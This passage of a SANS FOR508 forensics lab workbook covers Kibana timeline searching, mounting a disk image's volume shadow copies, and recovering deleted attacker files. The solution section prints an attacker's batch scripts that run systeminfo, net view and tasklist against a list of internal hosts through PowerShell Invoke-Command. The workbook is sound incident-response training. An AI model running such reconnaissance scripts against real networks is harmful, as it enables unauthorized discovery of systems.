The ELK installation on the 508 SIFT Linux VM is installed in a Docker container. The container is stopped by default, but you can
start it when you are ready by running the following command in a Terminal window in the SIFT VM. (Note that you can run this
as root or the regular sansforensics user.)
docker start srl-elk

Expected results

sansforensics@siftworkstation:
$ docker start srl-elk
srl-elk

.

After starting the Docker container, give it a few minutes to fully initialize (it shouldn't need more than 2-3 minutes). After a few
minutes, try to connect to the service at http://172.17.0.2. You should see the Kibana progress circle and then a page like the
following:

© 2023 SANS Institute

.

175

Note
Be sure to connect to http://172.17.0.2 and not https://172.17.0.2 . Sometimes Firefox really wants you to connect

.

using HTTPS!

176

© 2023 SANS Institute

.

Troubleshooting - Kibana page will not load
What if the Kibana page is still unavailable? Assuming you've given it a few minutes to initialize, then the problem is likely due
to the docker0 interface not getting an IP address. This happens occasionally with the Linux SIFT VM. To ﬁx it, run the
following command to restart the Network Manager service:
sudo systemctl restart NetworkManager

Next, restart the Docker service and start the srl-elk container again:
sudo systemctl restart docker
sudo docker start srl-elk

Here's an example showing the docker0 interface without the IPv4 inet address. After restarting NetworkManager and
Docker, then starting srl-elk , we see ifconfig shows docker0 now has IPv4 address of 172.17.0.1 . Running
sudo docker ps should conﬁrm that the srl-elk container is running. Once your system shows docker0 with an IP address,

.

try connecting to Kibana again at http://172.17.0.2.

© 2023 SANS Institute

.

177

Troubleshooting - Cannot connect to the Docker daemon
If you see the error message Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker
daemon running? , it is likely because Docker failed to start. This happens occasionally. To ﬁx it, simply start the service as

follows:
sudo systemctl start docker

Verify the status with:
sudo systemctl status docker

Now start the srl-elk Docker container again:
sudo docker start srl-elk

Note that it should be safe to suspend your VM while the ELK service is running. However, we have noticed that the

docker0

interface does not always come back up after resuming the VM. In that case, follow the steps in the "Troubleshooting - Kibana
page will not load" section above.

Walkthrough – Getting Acquainted with SRL ELK
1. Review the pre-conﬁgured dashboard designed to highlight the SRL data

.

• Click Dashboard from the options on the left, then click SRL Log2timeline Dashboard:

• You should see the following dashboard with several visualizations related to the SRL timeline data:

178

© 2023 SANS Institute

.

.

• Notice several important features of the SRL Log2timeline Dashboard:
• A time frame is preset at the top-right of the page which includes all the relevant data from the SRL timelines. The
pertinent activity occurred in January 2023. As you explore the data in Kibana, be aware that this time ﬁlter may
unintentionally get set to a different range, which will impact the events you see. While working the SRL case, you will
need to ensure that any ﬁlters you apply are for the time frame between January 1, 2023 and January 27, 2023. To
get back to our preset time frame, you can click on Dashboard > SRL Log2timeline Dashboard again.
• The total number of records for all the loaded super timelines is 11,748,577. This number is more than the total
number available in the CSV-version of the super timelines on ISO "C". For the CSV-version of the super timelines, two
noise ﬁltering processes were applied to all of the timelines so that they can be opened with Timeline Explorer in your
VM (individually, not necessarily simultaneously). However, since Elasticsearch is designed to store and search "big
data" eﬃciently, several of the "specialty servers" did not have any Windows event logs ﬁltered. This gives you the
opportunity to identify some additional events that may be relevant. The servers that did not have Windows event log
ﬁltering applied were dc01

exchange01

sql01

dev01

, and ftp01 .
wac01

© 2023 SANS Institute

.

179

Filtering notes
• For all timelines, ﬁltering was applied to remove ﬁle system events deemed noisy and likely benign in the SRL
environment. The ﬁltering process and noise ﬁle utilized were discussed in Step 4 of the section "Create a
Filesystem Timeline" in Lab 4.2: Filesystem Timeline Creation.
• For all of the end-user workstations and a few of the standard servers, an additional ﬁltering process was
applied to remove Windows event logs that were deemed less likely to be important in the SRL environment.
The Windows event log ﬁltering process was discussed in Step 4 of the section "Create the Super Timeline
and Prep for Analysis" in Lab 4.3A: Super Timeline Creation - Windows and Lab 4.3B: Super Timeline Creation
- Linux.

• The middle chart visualizations on the dashboard breakdown the records by type (i.e., the parser used by
log2timeline) and by hostname. You can highlight and click the bars and slices to automatically ﬁlter the data.
• The bottom table view shows the raw events from the super timeline data. As you apply ﬁlters and searches, the data
in this table will update accordingly.
2. Using the Search bar to ﬁlter
• The Search bar across the top of the Kibana interface allows for querying the data using the Lucene query language. This
can be as simple as providing a keyword to search, or as complex as limiting searches to speciﬁc ﬁelds and even
performing fuzzy keyword searches.
• Below is an example of a basic keyword search for wacsvc and also a ﬁlter for the hostname rd01 . The hostname ﬁlter
was created by clicking on the hostname in the pie-chart in the center-right of the dashboard. The result of this search
found 20,523 responsive records. The details of those records can be viewed in the table at the bottom of the dashboard

.

(not shown).

• The straight ﬁlter for wacsvc above works ﬁne, but it can lead to a lot of extraneous data because it's a keyword ﬁlter
across all ﬁelds. That produces a lot of entries you probably won't care too much about. Instead, we can say we only want
the "desc" ﬁeld to have "wacsvc" in it (note that "desc" in ELK is equivalent to "Long Description" in Timeline Explorer).
Change the basic wacsvc search to the more speciﬁc search desc:*wacsvc* . This is a more targeted search resulting in
8,797 records. It's still a lot of results, but it should produce more relevant data to work from.

180

© 2023 SANS Institute

.

Note
Heavy use of the asterisk * wildcard is not advised in a production ELK installation. This would be considered an
"expensive search" due to the extra resources required to handle the wildcards. However, we can get away with it in our
small single-user installation. The reason for surrounding the keyword term with asterisks is to ensure we don't miss
items where the term is part of a larger term. For example, if there was a directory of interest with the path

C:

\Windows\Update\wacsvcdata\ , a search for wacsvc by itself would not match. However, *wacsvc* will match, since

it tells Elasticsearch to return results even if there are characters before or after the term of interest.

• If you'd like to further narrow the results by adding additional criteria, typically the AND operator will do the job. For
example, to search speciﬁcally for LNK ﬁles in wacsvc's Recent folder, a search for desc:*wacsvc* AND desc:*lnk* AND
desc:*Recent* should ﬁnd the data you're looking for. This leads to just 182 records for this targeted search against

.

rd01 .

© 2023 SANS Institute

.

181

More ﬁltering tips
• The default operator when using multiple keywords is OR . So if you want to make sure all the keywords are in a
returned record, add AND between each keyword, as we did above.
• There are some reserved characters that need to be escaped with a backslash ( \ ). That list can be found on the
Elasticsearch regular expression page.
• To search for speciﬁc Windows event IDs, or ﬁelds within Windows event logs, try surrounding identifying text
with double-quotes. For example, to search speciﬁcally for logon events, try "EventId>4624<" . Or to search for a
speciﬁc type of logon to speciﬁc host, try something like "LogonType<2" AND rd01

• To remove a ﬁlter such as the hostname rd01 shown above, hover on the blue ﬁlter button and choose to either Disable
it (1st icon) or Remove it (4 th icon). For example, clicking the Trash icon will remove the ﬁlter:

Notice that the 3 rd icon (the magnifying glass with a “-“ in the middle) will invert the ﬁlter so that the search will exclude
the value (i.e., exclude rd01 in our example) and will turn the button from blue to red.

• Of course there's a lot more to searching with ELK than we can cover in a short walk-through, but hopefully this has given
you a good head start. It's worth noting that this version of ELK is not a typical way of ingesting log2timeline data into

.

Elasticsearch. However, we've chosen to do it this way so that the data you see in ELK will match very closely to the super
timeline CSVs created in our labs.

External resources
To ﬁnd additional tips about the query syntax, check out the following resources:
• https://www.cheatography.com/swaglord/cheat-sheets/kibana/
• https://www.timroes.de/kibana-search-cheatsheet (Use Lucene for our instance)

3. Pivot on your ﬁndings
• Reviewing timelines is typically a practice of applying ﬁlters to focus on items of interest, then looking around those items
to see what else occurred during that time frame. One way to do this in Kibana is to expand the item of interest and then
click the “View surrounding documents” button. To ﬁnd that button, click the little triangle icon to the left of the
timestamp. This will expand the record to see all available ﬁelds. You should now see the button toward the top-right of
the record:

182

© 2023 SANS Institute

.

Clicking this button will take you to a new view in Kibana where you can review the surrounding activity. Note that your
ﬁlters are no longer applied in this new view. It’s showing all surrounding records. You may need to apply some ﬁlters
again (such as a speciﬁc hostname) to narrow your focus. Use the magnifying glass icons to apply ﬁlters. Also, notice
you can easily load more items before or after the activity of interest using the buttons at the top and bottom of the new

.

view.

• When you are ready to return to main dashboard view, click “Dashboard” on the left-hand Kibana menu (and if necessary,
next choose SRL Log2timeline Dashboard).

Takeaways
Clearly a lot can be accomplished using ELK. Although we do not have time to oﬃcially cover it in FOR508, we wanted to provide
this ELK instance as an extra option for analyzing the SRL timeline data. Keep in mind that the goal of FOR508 is to teach the
analytical and deep-dive skills necessary to solve complex intrusion cases. Then once those skills are mastered, students are wellprepared to evaluate, implement, and utilize enterprise scaling tools such as ELK.

Tip
One of the goals of the FOR608 course is to apply the analysis techniques covered in FOR508 and scale them to even larger
environments. Tools such as Timesketch and Elasticsearch/OpenSearch are covered in detail to address this objective.

© 2023 SANS Institute

.

183

Lab 5.1: Mount and Examine VSS Images
Objectives
1. Mount and examine a full disk images and volume shadow copies using the SIFT Linux VM
2. Explore and extract data from multiple volume shadow copies
3. Create and de-duplicate a timeline containing volume shadow copy data

Lab Preparation
This lab requires BOTH the 5 08 SIFT LINUX VM and the 508 Windows VM
1. Launch the 508 SIFT LINUX VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics
2. For this lab, you will need the FOR508 ISO "B" ﬁle. The exact name of the ISO "B" ﬁle may change over time, so we will need to
be somewhat ﬂexible in how we describe it here. For the examples in this lab, the ISO "B" ﬁle that we will use is named
508.23.1B.iso . Your ISO "B" ﬁle may be named slightly differently, but it should end with a "B".

3. After locating your ISO "B" ﬁle, you will need to attach it to the Linux SIFT VM as a DVD drive. The conﬁguration for connecting
the ISO to the VM varies slightly depending on which VMware product is used (Workstation, Player, or Fusion). In all cases,
though, it will be speciﬁed via the guest Virtual Machine's Settings dialog box. Based on the VMware product you are using,
you can access a VM's CD/DVD conﬁguration Settings page as follows:

.

• VMware Workstation: Use the VM menu and choose Settings... > Hardware tab > CD/DVD
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Hardware tab > CD/DVD
• VMware Fusion: Choose Virtual Machine > CD/DVD > CD/DVD Settings...

Attention
Be sure to check the box to "Connect" the CD/DVD drive. It is easy to overlook, but it's required to access the data inside the
VM.

184

© 2023 SANS Institute

.

Example conﬁguring CD/DVD from VMware Workstation

In this case, the ISO ﬁle was located in the folder C:\508-Files and the ISO "B" ﬁle was named 508.23.1B.iso . Of course
you will need to browse to the location where you saved the ISO ﬁles that you downloaded from the SANS student portal.
• Reminder: Be sure to check the box to "Connect" the CD/DVD hardware to the guest.

4. Now inside the Linux VM, the ISO ﬁle should be auto-mounted within a few seconds and show up as a DVD drive, as shown
below. To verify, click the DVD button on the Activities bar to the left. It should open the root directory of the mounted IS O. If

.

you do not see the expected results, a reboot of the VM should ﬁx the problem.

© 2023 SANS Institute

.

185

.
You are now ready to proceed!
Mount Windows Disk Image
1. If you haven't done so yet, open a Terminal window.
2. Elevate your privileges to root. sudo password is forensics
sudo su

3. Change directories to the mounted DVD drive (ISO image) and run ls :
cd /media/sansforensics/
ls

You should now see a directory named after the ISO volume name. cd into that folder, as shown in this example for the
volume named 508.23.1B :

186

© 2023 SANS Institute

.

cd <Insert Your Volume Name Here (e.g., 508.23.1B)>

Example

Now change directories into SRL-DATA/Disk-Images and run ls -lh to check for the existence of the rd01-c-drive.E01 disk
image:
cd SRL-Data/Disk-Images
ls -lh

Example

4. The .E01 extension signiﬁes an Expert Witness compressed image ﬁle. We need to expose the rd01-c-drive.E01
compressed image ﬁle as an uncompressed raw disk image to work with our shadow copy library. We could run a command

.

to actually extract it out, much like unzipping a zip archive. However, that would take too much time and disk space. Instead,
we can use the ewfmount command to create a virtual representation of the uncompressed image. The ewfmount command
will create a virtual ﬁle named ewf1 in the target directory we specify. Run the following commands and then take note of the
ﬁle size of the new ewf1 raw image ﬁle.
ewfmount rd01-c-drive.E01 /mnt/ewf_mount/
cd /mnt/ewf_mount
ls -lh

© 2023 SANS Institute

.

187

It appears that we now have a 64 GB disk image! However, is that really a 64 GB ﬁle? No, it is not. It would have taken far
longer to create it if it had truly decompressed a 64 GB ﬁle. Instead, this is a representation of the raw image, which

ewfmount

will seamlessly translate into a full disk image from the compressed rd01-c-drive.E01 . This is similar to the way that
Windows File Explorer allows users to browse into the contents of zip ﬁles without requiring the zip ﬁles to be uncompressed
ﬁrst.
5. Now that we have what appears to be a raw disk image, we can use the standard Linux mount command to access the ﬁle
system within it. However, to simplify things a bit, we will use an alias to the mount command called mountwin , which has
several options preconﬁgured.
Review the conﬁguration of the mountwin alias as follows:
alias mountwin

Expected results

root@siftworkstation:/mnt/ewf_mount# alias mountwin

alias mountwin 'mount -o ro,show_sys_files,streams_interface=windows'

Here's a brief description of the options used in mountwin :
• -o speciﬁes to use the options that follow
• ro mounts the ﬁle system as read-only
• show_sys_files directs the OS to show NTFS hidden metadata ﬁles
• streams_interface=windows provides access to NTFS named data streams

.

6. Now use the following commands to mount the RD01 disk image. We start by creating a new directory in /mnt to host the
mounted ﬁle system. The mountwin command is then used to mount the raw disk as a ﬁle system within /mnt/rd01 .
mkdir /mnt/rd01
mountwin /mnt/ewf_mount/ewf1 /mnt/rd01/
cd /mnt/rd01
ls

Your results should look similar to below. At this point, all of the ﬁles and directories from RD01's C-drive are available for
analysis in Linux.

188

© 2023 SANS Institute

.

Expected results

root@siftworkstation:/mnt/ewf_mount# mkdir /mnt/rd01
root@siftworkstation:/mnt/ewf_mount# mountwin /mnt/ewf_mount/ewf1 /mnt/rd01/
root@siftworkstation:/mnt/ewf_mount# cd /mnt/rd01
root@siftworkstation:/mnt/rd01# ls

'$AttrDef'
'$BadClus'
'$Bitmap'
'$Boot
'$Extend'
'$LogFile'
'$MFTMirr'

'$Recycle.Bin'
'$Secure'
'$UpCase'
'$Volume'
'$WinREAgent'

BOOTNXT

ProgramData

'Program Files'
'Documents and Settings' 'Program Files (x86)'
BOOTSECT.BAK

DumpStack.log.tmp

Recovery

OneDriveTemp

swapfile.sys

Boot

pagefile.sys

bootmgr

PerfLogs

tmp
Users
Windows

'System Volume Information'
terraform

Mount Available Volume Shadows
1. Now that we have access to a raw disk image of rd01 , we can begin to analyze volume shadow copies. Let's start by
examining how many VSS snapshots exist inside the c-drive image by using the vshadowinfo command as follows:
vshadowinfo /mnt/ewf_mount/ewf1

• How many snapshot stores exist?

.

________________________________________________________________

© 2023 SANS Institute

.

189

Solution
You should see two stores:
• Store 1: Creation Time = Jan 17, 2023 14:43:55 UTC
• Store 2: Creation Time = Jan 23, 2023 02:09:15 UTC
Expected results

root@siftworkstation:/mnt/rd01# vshadowinfo /mnt/ewf_mount/ewf1
vshadowinfo 20191221
Volume Shadow Snapshot information:
Number of stores:
2
Store: 1
Identifier
: 4f5fed03-9551-11ed-b3e6-0a7afebd2722
Shadow copy set ID : eccf33e7-5b0b-40d9-ae77-b4c80fb13e83
Creation time
: Jan 17, 2023 14:43:55.396168000 UTC
Shadow copy ID
: 6467ba56-c497-4e30-89c3-f195a3c6d895
Volume size
: 63 GiB (68717379584 bytes)
Attribute flags
: 0x0042000d

.

Store: 2
Identifier
: babf6c54-9a65-11ed-b3e6-0a7afebd2722
Shadow copy set ID : 50583dd1-1544-4116-a634-74caae461944
Creation time
: Jan 23, 2023 02:09:15.953674800 UTC
Shadow copy ID
: a8339573-d550-4c45-9d91-9ae2dbe27ee2
Volume size
: 63 GiB (68717379584 bytes)
Attribute flags
: 0x0002001d

2. Now mount the raw image using vshadowmount to expose each of these stores as their own virtual disk image. We will expose
these stores into the /mnt/vss directory. Each shadow volume will get a ﬁle by the name of vssX , where X corresponds to
the store number. Note that the size of each ﬁle appears to be a full disk image (64 GB in the case of this disk image).
vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss
cd /mnt/vss
ls -lh

Expected results

root@siftworkstation:/mnt/rd01# vshadowmount /mnt/ewf_mount/ewf1 /mnt/vss
vshadowmount 20191221
root@siftworkstation:/mnt/rd01# cd /mnt/vss
root@siftworkstation:/mnt/vss# ls -lh
total 0

-r--r--r-- 1 root root 64G Jul 14 00:06 vss1
-r--r--r-- 1 root root 64G Jul 14 00:06 vss2
root@siftworkstation:/mnt/vss#

190

© 2023 SANS Institute

.

3. Next, we can mount each one of these vssX image ﬁles as logical ﬁle systems. We will use a for loop to automate it
somewhat. This next command will mount each of the vssX ﬁles into a corresponding directory in /mnt/shadow_mount . (It
may take close to a minute for the for loop to complete.)
for i in vss*; do mountwin $i /mnt/shadow_mount/$i; done

Expected results

root@siftworkstation:/mnt/vss# for i in vss*; do mountwin $i /mnt/shadow_mount/$i; done
root@siftworkstation:/mnt/vss#

4. Change directories to the /mnt/shadow_mount/vss1 directory and list the contents. You should see the ﬁles and folders as
they existed at the time of the VSS1 snapshot (Jan 17, 2023 14:43:55 UTC).
cd /mnt/shadow_mount/vss1
ls

Expected results

tmp
Users
Windows

.

root@siftworkstation:/mnt/vss# cd /mnt/shadow_mount/vss1
root@siftworkstation:/mnt/shadow_mount/vss1# ls
'$AttrDef' '$Recycle.Bin'
BOOTNXT
ProgramData
'$BadClus' '$Secure'
BOOTSECT.BAK
'Program Files'
'$Bitmap'
'$UpCase'
'Documents and Settings' 'Program Files (x86)'
'$Boot'
'$Volume'
DumpStack.log.tmp
Recovery
'$Extend'
'$WinREAgent'
OneDriveTemp
swapfile.sys
'$LogFile'
Boot
pagefile.sys
'System Volume Information'
'$MFTMirr'
bootmgr
PerfLogs
terraform

Lab Questions
With access to the volume shadow snapshots, we can use the snapshot images to analyze individual ﬁles. It can also be used as
a source for creating ﬁle system timelines. This type of timeline incorporates the changes to the ﬁle system both from the active
ﬁle system, as well as from each of the available volume shadow copies. This can be very powerful and relatively quick to create.
That said, we will use a "precooked" volume shadow ﬁle system timeline for analysis in this lab. The details for creating the
timeline are provided in the Optional Homework section after the questions. It takes 10 minutes or more to create the timeline.
That's not too long, but longer than we want you waiting in class for processing to ﬁnish. To brieﬂy summarize the process, it
involves using a combination of The Sleuth Kit's fls tool to extract ﬁle system metadata and then Linux utilities such as

sort

and uniq to deduplicate the events.
For this part of the lab, let's perform some analysis using the precooked volume shadow ﬁle system timeline. We will be switching
to the 508 Windows VM for analysis and using the 508 SIFT LINUX VM for raw access to ﬁles within the shadow copies.
In the 508 Windows VM, use Timeline Explorer to open rd01-vss-final.csv from the G:\Precooked\timeline\ directory.

© 2023 SANS Institute

.

191

1. Perform a search in Timeline Explorer for the attacker's directory C:\Windows\Update . What are some of the main differences
from the active ﬁle system timeline that we've been analyzing up to this point (i.e., in comparison to G:
\Precooked\timeline\rd01-filesystem-timeline-final.csv analyzed in Lab 4.2)?

________________________________________________________________
________________________________________________________________

.

________________________________________________________________

192

© 2023 SANS Institute

.

Solution
There are many more ﬁles in the C:\Windows\Update directory than are available in the active ﬁle system. If you do a
comparison with the active ﬁle system timeline created in Lab 4.2 ( G:\Precooked\timeline\rd01-filesystem-timelinefinal.csv ), you'll notice there were just 14 entries in that ﬁle system timeline with the ﬁlter C:\Windows\Update . Compare

that to the new volume shadow ﬁle system timeline, where we see 1,414 entries. Quite a difference! This is extremely
useful, as these extra entries might include tools, scripts, and exﬁl ﬁles we would not be able to identify or recover
otherwise.

.

• C:\Windows\Update ﬁles in the original active ﬁle system timeline:

• C:\Windows\Update ﬁles in the new volume shadow ﬁle system timeline:

© 2023 SANS Institute

.

193

2. When working intrusion cases, it is often useful to search for new executables and scripts on potentially compromised hosts.
In the volume shadows copies present on RD01, do we ﬁnd any batch scripts (e.g., .bat ﬁles) in the attacker's tool directory

.

which we were not able to recover from the active ﬁle system?
________________________________________________________________
________________________________________________________________

194

© 2023 SANS Institute

.

Finding ﬁle types of interest using advanced Timeline Explorer ﬁlters
In Timeline Explorer, we can also create complex Boolean ﬁlters allowing us to ﬁlter for multiple things, like both a path
and an extension. Advanced ﬁlters are built using the

Edit Filter option. Create a ﬁlter for batch ﬁles by searching for

.

the ﬁle path ﬁrst and then adding a ﬁlter of "Ends with .bat ":

© 2023 SANS Institute

.

195

.
196

© 2023 SANS Institute

.

Solution
• There were two batch ﬁles of interest in the sub-folders of C:\Windows\Update . After clicking OK on the ﬁlter described
in the Hints above, you should see the following:

• We have seen evidence of one of these in prior analysis (during Prefetch analysis in Lab 2.1). However, we have not
had an opportunity for recovery and analysis since neither ﬁle is present in the current ﬁle system. Volume shadow
copy analysis can make it quite simple...if we can get to the evidence while the volume shadow copies are available.
(And maybe even if we can't...stay tuned for our anti-forensics discussion!)
3. Which VSS snapshot contains the batch ﬁles of interest?

.

SNAPSHOT NAME ( vss1 or vss2 ):
________________________________________________________________
Hint - Finding ﬁles of interest using the Linux Bash shell
The following command (run in the 508 SIFT LINUX VM) demonstrates one way to search your mounted volume shadow
copies. It recursively searches for the location(s) of a ﬁlename of interest ( data.bat in this example).
• This find command takes 2-3 minutes to complete.
cd /mnt/shadow_mount
find . | grep -i data\.bat

© 2023 SANS Institute

.

197

Solution
Snapshot name: vss2
Expected results

root@siftworkstation:/mnt/shadow_mount# find . | grep -i data\.bat
./vss2/Windows/Update/rec/data.bat
root@siftworkstation:/mnt/shadow_mount#

4. At what date and time was that volume shadow copy created?
________________________________________________________________
Hint
Running vshadowinfo against the uncompressed disk image within the 508 SIFT LINUX VM reports the available
snapshots and when they were taken. You might have documented this information previously.
Solution
Jan 23, 2023 02:09:15 UTC
vshadowinfo /mnt/ewf_mount/ewf1

.

Expected results

root@siftworkstation:/mnt/shadow_mount# vshadowinfo /mnt/ewf_mount/ewf1
vshadowinfo 20191221
Volume Shadow Snapshot information:
Number of stores:
2
Store: 1
Identifier
: 4f5fed03-9551-11ed-b3e6-0a7afebd2722
Shadow copy set ID : eccf33e7-5b0b-40d9-ae77-b4c80fb13e83
Creation time
: Jan 17, 2023 14:43:55.396168000 UTC
Shadow copy ID
: 6467ba56-c497-4e30-89c3-f195a3c6d895
Volume size
: 63 GiB (68717379584 bytes)
Attribute flags
: 0x0042000d

Store: 2
Identifier
: babf6c54-9a65-11ed-b3e6-0a7afebd2722
Shadow copy set ID : 50583dd1-1544-4116-a634-74caae461944

Creation time

: Jan 23, 2023 02:09:15.953674800 UTC

Shadow copy ID
: a8339573-d550-4c45-9d91-9ae2dbe27ee2
Volume size
: 63 GiB (68717379584 bytes)
Attribute flags
: 0x0002001d

198

© 2023 SANS Institute

.

5. For the batch scripts discovered, can you determine what their purpose was? Challenge:Can you tell which systems they
targeted?
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Hint - Reviewing shadow copy ﬁles on Windows or Linux
• From Windows, you can access the volume shadow copy mounts on the Linux VM using the pre-conﬁgured share to
the mnt directory via \\siftworkstation . Note that the hostname

siftworkstation

doesn't always resolve correctly,

so you may need to get the IP address of the SIFT's ens33 interface with ifconfig ens33 and use that instead of the
siftworkstation hostname (e.g., use \\<SIFT-IP> instead). You can then browse the mounted shadow volumes,

.

such as vss2 :

• From Linux, it's generally a matter of using cat or less or similar tool to review the data. For example:
less /mnt/shadow_mount/vss2/Windows/Update/rec/data.bat

© 2023 SANS Institute

.

199

Solution
• data.bat runs a FOR loop over the contents of comps.txt . For each line in comps.txt , it provides it as input to
test.bat .

data.bat contents

@echo off

for /f "tokens=*" %%A in (comps.txt do test.bat %%A

• test.bat takes a hostname as input and runs multiple data-gathering commands against the host via PowerShell
Remoting (speciﬁcally, via Invoke-Command ).
Snippet of test.bat contents

@echo off
echo. >> c:\windows\update\%1.txt
echo
echo *** Checking %1 ***
echo

.ir
01
de

echo. >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt

>> c:\windows\update\%1.txt
>> c:\windows\update\%1.txt
>> c:\windows\update\%1.txt

hi

echo ***SystemInfo** >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt
powershell -command "Invoke-Command {systeminfo} -ComputerName %1" >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt
echo ***Net View** >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt
powershell -command "Invoke-Command {net view} -ComputerName %1" >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt
echo ***Net View (Domain)** >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt
powershell -command "Invoke-Command {net view /domain} -ComputerName %1" >> c:\windows\update\
%1.txt
echo. >> c:\windows\update\%1.txt
echo ***Tasklist** >> c:\windows\update\%1.txt
echo. >> c:\windows\update\%1.txt
powershell -command "Invoke-Command {tasklist /v} -ComputerName %1"

• Which hosts did it target? That's found in the contents of comps.txt :

200

© 2023 SANS Institute

.

>> c:\windows\update\%1.txt

Contents of comps.txt

root@siftworkstation:/mnt/shadow_mount# cat /mnt/shadow_mount/vss2/Windows/Update/rec/comps.txt

echo
dc01.shieldbase.com
file01.shieldbase.com
exchange01.shieldbase.com
proxy01.shieldbase.com
dev01.shieldbase.com
sql01.shieldbase.com
wac01.shieldbase.com
root@siftworkstation:/mnt/shadow_mount#

We have just scratched the surface of the extra data now at our ﬁngertips. While the extra data can seem overwhelming at times,
being able to access and analyze volume shadow copies effectively can make a huge difference in the overall outcome of the
case.

Optional Homework: Volume Shadow File System Timeline Creation
With access to the volume shadow snapshots, we can use the snapshot image ﬁles ( vssX ) as sources for creating ﬁle system
timelines. We can then deduplicate them to get a single timeline of changes to the ﬁle system over an extended period. To do this,
we will use a combination of The Sleuth Kit's fls tool and some Linux utilities such as sort and uniq .
1. Begin by creating a ﬁle system timeline from the active image. Note that we did this in a previous lab using MFTEcmd , but we'll
do it again here to incorporate with the shadow ﬁle system timelines, and we'll take the opportunity to use The Sleuth Kit's
equivalent fls tool to generate the body ﬁles. (Expect the fls command here to take a couple of minutes to run.)

.

fls -r -m C: /mnt/ewf_mount/ewf1 > /cases/cdrive/rd01-vss.body

2. Next, we create ﬁle system timelines for each of the volume shadow snapshots. We use a for loop to run it against each
snapshot image ﬁle in /mnt/vss . Notice the use of >> , which will append the output from this command to the

rd01-

vss.body ﬁle we created in the previous step.

cd /mnt/vss
for i in vss*; do fls -r -m C: $i >> /cases/cdrive/rd01-vss.body; done

3. Now that all the timeline data has been added to rd01-vss.body , we sort the data and then deduplicate it with the uniq
command. Then we create a CSV ﬁle with mactime , ﬁltering to our time range of interest for this case.
cd /cases/cdrive
sort rd01-vss.body | uniq > dedupe-rd01-vss.body
mactime -z UTC -y -d -b dedupe-rd01-vss.body 2023-01-01..2023-01-27 > rd01-vss.csv

4. As we did when creating the ﬁle system timeline in Lab 4.2, we can remove some noisy events using grep -v and keywords
from our ﬁlter ﬁle named timeline_noise.txt . We can also use sed to swap the forward slashes for backslashes to match
the path style used by Windows.

© 2023 SANS Institute

.

201

Attention
The timeline_noise.txt used in this case is speciﬁcally tailored to the Stark Research Labs environment. You should
review it and customize it for your environment, if you choose to ﬁlter noisy events all.

grep -a -v -i -f /cases/precooked/timeline/timeline_noise.txt rd01-vss.csv > rd01-vss-final.csv
sed -i 's/\//\\/g' rd01-vss-final.csv

5. You now have a timeline that includes unique ﬁle system events from the active volume as well as 2 volume shadow copies.
Open rd01-vss-final.csv with Timeline Explorer on your FOR508 Windows VM for review.

Note
There are several ways to transfer ﬁles between the VMs. We've described the most common ones in the Resources
document VM File Transfer Options.

Lab Takeaways
• Using volume shadow copies to ﬁnd and extract deleted ﬁles is incredibly useful to an examiner.
• We were able to identify ﬁles that were likely stolen from this system. The staging folders found in the VSS2 snapshot would
prove invaluable to providing evidence as to what the adversary was seeking.
• We were able to identify additional key ﬁles used by the attacker while on the system. In particular, the batch ﬁles show the

.

method the attacker used to perform recon and data gathering in the environment.

202

© 2023 SANS Institute

.

Lab 5.2: VSS Super Timeline Creation
Objectives
1. Create a Super Timeline against a full volume image, processing both the active ﬁle system and volume shadow copies.
2. Use a ﬁlter ﬁle to focus the run of the log2timeline.py to process only the desired data from active and volume shadow
copy ﬁle systems.

Lab Preparation
This lab is completed in your 508 SIFT LINUX VM

Attention
We have noticed that the default hardware settings for the 508 SIFT VM may not be suﬃcient for this bonus lab. The 508
SIFT's default RAM is 4 GB and CPU count is 2. We recommend doubling those settings to complete this lab (8GB RAM / 4
CPU). Otherwise, you will likely see the log2timeline workers prematurely die during processing with a killed state.

1. Launch the 508 SIFT LINUX VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics
2. For this lab, you will need the FOR508 ISO "B" ﬁle. The exact name of the ISO "B" ﬁle may change over time, so we will need to
be somewhat ﬂexible in how we describe it here. For the examples in this lab, the ISO "B" ﬁle that we will use is named

.

508.23.1B.iso . Your ISO "B" ﬁle may be named slightly differently, but it should end with a "B".

3. After locating your ISO "B" ﬁle, you will need to attach it to the Linux SIFT VM as a DVD drive. The conﬁguration for connecting
the ISO to the VM varies slightly depending on which VMware product is used (Workstation, Player, or Fusion). In all cases,
though, it will be speciﬁed via the guest Virtual Machine's Settings dialog box. Based on the VMware product you are using,
you can access a VM's CD/DVD conﬁguration Settings page as follows:
• VMware Workstation: Use the VM menu and choose Settings... > Hardware tab > CD/DVD
• VMware Player: Choose Player > Manage > Virtual Machine Settings... > Hardware tab > CD/DVD
• VMware Fusion: Choose Virtual Machine > CD/DVD > CD/DVD Settings...

Attention
Be sure to check the box to "Connect" the CD/DVD drive. It is easy to overlook, but it's required to access the data inside the
VM.

© 2023 SANS Institute

.

203

Example conﬁguring CD/DVD from VMware Workstation

In this case, the ISO ﬁle was located in the folder C:\508-Files and the ISO "B" ﬁle was named 508.23.1B.iso . Of course
you will need to browse to the location where you saved the ISO ﬁles that you downloaded from the SANS student portal.
• Reminder: Be sure to check the box to "Connect" the CD/DVD hardware to the guest.

4. Now inside the Linux VM, the ISO ﬁle should be auto-mounted within a few seconds and show up as a DVD drive, as shown
below. To verify, click the DVD button on the Activities bar to the left. It should open the root directory of the mounted ISO. This

.

will give you access to the RD01 disk image we'll use in the lab.

204

© 2023 SANS Institute

.

.
You are now ready to proceed!

Volume Shadow Super Timeline Creation -- Step-by-Step Guide
1. If you haven't done so yet, open a Terminal window.
2. Elevate your privileges to root. sudo password is forensics
sudo su

3. Change directories to the mounted DVD drive and run ls :
cd /media/sansforensics/
ls

You should now see a directory named after the ISO/DVD volume name. cd into that folder, as shown in this example for the
volume named 508.23.1B :

© 2023 SANS Institute

.

205

cd <Insert Your Volume Name Here (e.g., 508.23.1B)>

Example

4. Now change directories into SRL-DATA/Disk-Images and then run ls -lh to check for the existence of the rd01-c-drive.E01
disk image:
